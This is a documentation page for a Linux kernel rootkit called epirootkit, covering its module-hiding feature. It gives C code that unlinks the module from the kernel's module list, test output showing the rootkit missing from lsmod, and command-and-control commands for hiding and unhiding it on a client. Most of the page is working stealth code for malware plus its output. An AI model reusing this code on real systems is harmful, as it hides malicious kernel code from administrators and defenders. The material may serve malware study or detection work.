---
title: "Module Hiding"
description: "Hide the rootkit module from lsmod and /proc/modules"
icon: "visibility_off"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 514
---

# Module Hiding

Hide the rootkit module from `lsmod` and `/proc/modules` by removing it from the kernel's module list.

## Implementation

```c
int hide_module(void)
{
    if (module_hiding_state.hidden)
        return 0;

    module_hiding_state.prev_module_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hiding_state.hidden = true;
    
    return 0;
}
```

Removes the module from kernel's linked list using `list_del()` while saving the previous entry for restoration.

{{< alert context="warning" text="The [Line Hiding](./line-hiding.md) also hides the module from `/proc/modules` so to test module visibility with lsmod, you must disable line hiding." >}}

## Testing

```bash
# Before hiding
lsmod | grep epirootkit
# Output: epirootkit    16384  0

# After hiding  
lsmod | grep epirootkit
# Output: (nothing)
```

## Control

### WebUI
Toggle via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**

### C2 Commands
```bash
hide-module Client-1      # Hide module
unhide-module Client-1    # Make visible
status Client-1           # Check state
```

Module remains fully functional while hidden. 